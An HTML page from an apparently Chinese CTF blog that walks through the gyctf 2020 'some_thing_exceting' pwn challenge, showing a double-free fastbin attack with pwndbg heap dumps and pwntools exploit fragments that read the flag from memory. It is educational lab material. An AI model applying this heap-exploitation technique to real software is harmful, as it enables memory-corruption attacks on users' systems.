@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>gyctf_2020_some_thing_exceting详解 | Shuwen&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="还是高校战役的题，并且以前做过，，，，但当时tcl，复现也不会，虽然现在也很菜 这里再重新写篇文章，记录下。  程序流程 init程序最开始进入了init函数  init函数首先将flag读入了内存。 接着又将内存flag的数据读入了s，在0x6020a8中。 由于0x6020a0处设置了0x60，可以将fake chunk申请到这里，再读取块数据，即可得到flag   功能 create：创建">
+<meta property="og:type" content="article">
+<meta property="og:title" content="gyctf_2020_some_thing_exceting详解">
+<meta property="og:url" content="http://yoursite.com/2021/05/01/%C2%96gyctf-2020-some-thing-exceting%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:site_name" content="Shuwen&#39;s blog">
+<meta property="og:description" content="还是高校战役的题，并且以前做过，，，，但当时tcl，复现也不会，虽然现在也很菜 这里再重新写篇文章，记录下。  程序流程 init程序最开始进入了init函数  init函数首先将flag读入了内存。 接着又将内存flag的数据读入了s，在0x6020a8中。 由于0x6020a0处设置了0x60，可以将fake chunk申请到这里，再读取块数据，即可得到flag   功能 create：创建">
+<meta property="og:image" content="http://yoursite.com/2021/05/01/%C2%96gyctf-2020-some-thing-exceting%E8%AF%A6%E8%A7%A3/image-20210501212850010.png">
+<meta property="og:image" content="http://yoursite.com/2021/05/01/%C2%96gyctf-2020-some-thing-exceting%E8%AF%A6%E8%A7%A3/image-20210501213125204.png">
+<meta property="article:published_time" content="2021-05-01T13:48:15.000Z">
+<meta property="article:modified_time" content="2021-05-01T16:05:16.286Z">
+<meta property="article:author" content="winter">
+<meta property="article:tag" content="double free">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/05/01/%C2%96gyctf-2020-some-thing-exceting%E8%AF%A6%E8%A7%A3/image-20210501212850010.png">
+  
+    <link rel="alternate" href="../../../../atom.xml" title="Shuwen&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="../../../../css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="../../../../index.html" id="logo">Shuwen&#39;s blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="../../../../index.html" id="subtitle">爱学习的书文</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="../../../../index.html">Home</a>
+        
+          <a class="main-nav-link" href="../../../../archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="../../../../atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-gyctf-2020-some-thing-exceting详解" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="" class="article-date">
+  <time datetime="2021-05-01T13:48:15.000Z" itemprop="datePublished">2021-05-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="../../../../categories/buu/">buu</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      gyctf_2020_some_thing_exceting详解
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>还是高校战役的题，并且以前做过，，，，<del>但当时tcl，复现也不会，虽然现在也很菜</del></p>
+<p>这里再重新写篇文章，记录下。</p>
+</blockquote>
+<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/05/01/%C2%96gyctf-2020-some-thing-exceting%E8%AF%A6%E8%A7%A3/image-20210501212850010.png" alt="image-20210501212850010"></p>
+<h4 id="init"><a href="#init" class="headerlink" title="init"></a>init</h4><p>程序最开始进入了init函数</p>
+<blockquote>
+<p>init函数首先将flag读入了内存。</p>
+<p>接着又将内存flag的数据读入了s，在0x6020a8中。</p>
+<p>由于0x6020a0处设置了0x60，可以将fake chunk申请到这里，再读取块数据，即可得到flag</p>
+</blockquote>
+<p><img src="/2021/05/01/%C2%96gyctf-2020-some-thing-exceting%E8%AF%A6%E8%A7%A3/image-20210501213125204.png" alt="image-20210501213125204"></p>
+<h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ol>
+<li>create：创建一个指针chunk，里面存放了ba和na两个块的地址；创建ba和na，大小为0~0x70，fastbin大小内。</li>
+<li>delete：free块，但是没有清零，可以double free，获得一定的地址读写能力</li>
+<li>view：根据idx打印内容。</li>
+</ol>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
+<li>两次create</li>
+<li>free(0) -&gt; free(1) -&gt; free(0)</li>
+<li>重新申请create2，此时修改2的内容，由于0和2是同一个地址，修改2，修改了0的内容，重新申请4的时候，就可以申请到想要的地址</li>
+<li>修改2的内容为0x6020a0-0x8</li>
+<li>create3，create4</li>
+<li>4即申请到了0x6020a0的位置，打印其内容即为flag</li>
+</ol>
+<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-保护"><a href="#0-保护" class="headerlink" title="0.保护"></a>0.保护</h4><blockquote>
+<p>没开pie</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec gyctf_2020_some_thing_exceting </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_some_thing_exceting&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-两次创建"><a href="#1-两次创建" class="headerlink" title="1.两次创建"></a>1.两次创建</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf74000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf74230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75240</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf752c0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75320</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75340</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf753a0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75400</span><br><span class="line">Size: 0x1fc01</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x50</span>,<span class="string">'aaaa'</span>,<span class="number">0x50</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">'aaaa'</span>,<span class="number">0x50</span>,<span class="string">'bbbb'</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-double-free"><a href="#2-double-free" class="headerlink" title="2.double free"></a>2.double free</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ac000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ac230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad240</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x10ad320</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ad260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad2c0</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x10ad3a0</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad320</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x10ad240</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad340</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x10ad2c0</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad3a0</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x10ad340</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ad400</span><br><span class="line">Size: 0x1fc01</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x10ad240 —▸ 0x10ad320 ◂— 0x10ad240</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x10ad2c0 —▸ 0x10ad3a0 —▸ 0x10ad340 ◂— 0x10ad2c0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-create-3，并修改fd为fake-chunk"><a href="#3-create-3，并修改fd为fake-chunk" class="headerlink" title="3.create 3，并修改fd为fake chunk"></a>3.create 3，并修改fd为fake chunk</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce5000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce5230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce6240</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0xce62d0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce6260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce62c0</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x602098</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce6320</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0xce6240</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce6340</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0xce62c0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce63a0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce6400</span><br><span class="line">Size: 0x1fc01</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0xce6320 —▸ 0xce6240 —▸ 0xce62d0 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0xce6340 —▸ 0xce62c0 —▸ 0x602098 ◂— &#39;flag&#123;winter_excited&#125;&#39;</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk &#x3D; 0x6020a0 - 0x8</span><br><span class="line">create(0x50,p64(fake_chunk),0x50,p64(fake_chunk))#2</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-create4，create5（申请到fake地址）"><a href="#4-create4，create5（申请到fake地址）" class="headerlink" title="4.create4，create5（申请到fake地址）"></a>4.create4，create5（申请到fake地址）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x652000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x652230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653240</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6532c0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653320</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653340</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6533a0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653400</span><br><span class="line">Size: 0x81</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653480</span><br><span class="line">Size: 0x1fb81</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x6532d0 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x6e69777b67616c66 (&#39;flag&#123;win&#39;)</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x6020a0-8</span><br><span class="line">0x602098:	0x0000000000000000	0x0000000000000060</span><br><span class="line">0x6020a8:	0x6e69777b67610a61	0x696378655f726574</span><br><span class="line">0x6020b8:	0x000000007d646574	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30s 0x6020a0-8</span><br><span class="line">0x602098:	&quot;&quot;</span><br><span class="line">0x602099:	&quot;&quot;</span><br><span class="line">0x60209a:	&quot;&quot;</span><br><span class="line">0x60209b:	&quot;&quot;</span><br><span class="line">0x60209c:	&quot;&quot;</span><br><span class="line">0x60209d:	&quot;&quot;</span><br><span class="line">0x60209e:	&quot;&quot;</span><br><span class="line">0x60209f:	&quot;&quot;</span><br><span class="line">0x6020a0:	&quot;&#96;&quot;</span><br><span class="line">0x6020a2:	&quot;&quot;</span><br><span class="line">0x6020a3:	&quot;&quot;</span><br><span class="line">0x6020a4:	&quot;&quot;</span><br><span class="line">0x6020a5:	&quot;&quot;</span><br><span class="line">0x6020a6:	&quot;&quot;</span><br><span class="line">0x6020a7:	&quot;&quot;</span><br><span class="line">0x6020a8:	&quot;a\nag&#123;winter_excited&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x50</span>,p64(fake_chunk),<span class="number">0x50</span>,p64(fake_chunk))<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">'a'</span>,<span class="number">0x70</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="5-打印4"><a href="#5-打印4" class="headerlink" title="5.打印4"></a>5.打印4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0xac bytes:</span><br><span class="line">    &quot;# Banana&#39;s ba is a\n&quot;</span><br><span class="line">    &#39;ag&#123;winter_excited&#125;\n&#39;</span><br><span class="line">    &quot;# Banana&#39;s na is a\n&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">view(4)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure>
+
+<p>以前写的：<a href="https://blog.csdn.net/qq_43935969/article/details/104756082?spm=1001.2014.3001.5501" target="_blank" rel="noopener">i春秋新春战役PWN之Some_thing_exceting</a></p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="gyctf_2020_some_thing_exceting">文件</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/05/01/%C2%96gyctf-2020-some-thing-exceting%E8%AF%A6%E8%A7%A3/" data-id="cl03lvj570039ewjn5oeh08fp" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/double-free/" rel="tag">double free</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="../picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          picoctf_2018_leak_me详解
+        
+      </div>
+    </a>
+  
+  
+    <a href="../../../04/30/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">软件安装</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="../../../../categories/advanced-pwn/">advanced pwn</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/blockchain/">blockchain</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/book/">book</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/buu/">buu</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/chrome/">chrome</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/ida/">ida</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/iot/">iot</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/reverse/">reverse</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/v8/">v8</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E4%B8%93%E9%A2%98/">专题</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E5%88%86%E4%BA%AB/">分享</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E5%A4%8D%E7%8E%B0/">复现</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E5%B7%A5%E5%85%B7/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6/">常用软件</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E6%80%BB%E7%BB%93/">总结</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E7%AE%97%E6%B3%95/">算法</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
